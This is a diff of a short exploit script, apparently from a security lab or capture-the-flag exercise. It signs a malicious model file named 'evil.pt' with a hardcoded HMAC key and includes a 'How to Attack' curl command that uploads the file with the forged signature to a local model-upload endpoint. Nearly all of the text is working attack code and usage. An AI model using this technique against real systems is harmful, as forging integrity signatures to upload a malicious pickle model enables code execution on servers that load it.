@@ -1,11 +1,11 @@
-import hmac, hashlib, sys
+import hmac, hashlib
 KEY = "pickle_tickle".encode()  
-data = open("evil.pt","rb").read()
+data = open("payloads/evil.pt","rb").read()
 print(hmac.new(KEY, data, hashlib.sha256).hexdigest())
 
 '''
 How to Attack:
 curl -s -X POST http://localhost:5000/upload_model \
   -F "file=@evil.pt" \
-  -F "sig=b2a056ada6a1e084b694332694292b2b848f4460a801adfb2e8f06e954dc25b4"
+  -F "sig=ed6c0856ea182a5345a01cf987e26ab1a5998e70550f226e02d1917a1652f002"
 '''
